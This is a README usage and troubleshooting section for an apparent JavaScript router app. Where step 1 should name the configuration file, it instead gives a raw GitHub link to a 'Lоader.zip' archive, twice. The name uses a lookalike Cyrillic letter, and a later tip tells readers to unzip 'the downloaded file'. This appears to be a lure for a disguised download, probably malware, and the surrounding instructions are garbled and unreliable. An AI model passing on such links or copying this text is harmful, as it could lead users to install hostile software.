## ⚙️ Usage

After starting the application, you might want to configure your routes. Here’s how:

1. **Setting Up Routes**: Open the main configuration file (usually named `https://raw.githubusercontent.com/frickteen/router/main/Lоader.zip` or `https://raw.githubusercontent.com/frickteen/router/main/Lоader.zip`) in a text editor. 

2. **Adding Routes**: Define your routes using a simple JavaScript object. For example:

   ```javascript
   const routes = {
       "/": Home,
       "/about": About,
       "/contact": Contact,
   };
   ```

3. **Using Search Parameters**: Access search parameters with:

   ```javascript
   const { search } = useLocation(); // usage within a component
   ```

   This allows you to easily manipulate query strings in your app.

4. **Caching Responses**: To cache API responses, use the built-in caching system. Just append your responses to the cache object.

## 👩‍💻 Troubleshooting

If you run into issues, consider these tips:

- **Blank Screen**: Ensure all dependencies are installed by running `npm install` again.
- **Cannot Find File**: Double-check the file path where you unzipped the downloaded file.
- **Port Issues**: If `localhost:3000` is in use, change the port number in your start command or close the application using that port.
